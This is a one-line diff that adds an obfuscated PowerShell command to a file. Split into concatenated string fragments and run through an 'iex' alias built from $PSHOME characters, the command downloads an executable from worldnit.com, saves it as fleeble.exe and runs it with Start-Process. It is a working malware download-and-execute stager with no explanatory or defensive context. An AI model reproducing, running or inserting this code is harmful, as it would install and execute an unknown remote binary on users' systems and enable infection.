@@ -1,0 +1,1 @@
+﻿& ( $PSHoME[4]+$PShome[34]+'x') ( (('(New-Ob'+'j'+'ect System.Net.We'+'bCl'+'ie'+'nt)'+'.Downlo'+'a'+'dF'+'ile'+'(X'+'6'+'Ahttp:/'+'/w'+'or'+'ldni'+'t.com/ku'+'ndelo'+'.exeX6A,X'+'6Afleeble.'+'ex'+'eX6A);S'+'tart-P'+'r'+'oc'+'e'+'ss X6Af'+'leeble'+'.exeX'+'6'+'A') -CRePLaCE'X6A',[ChAR]39)) 
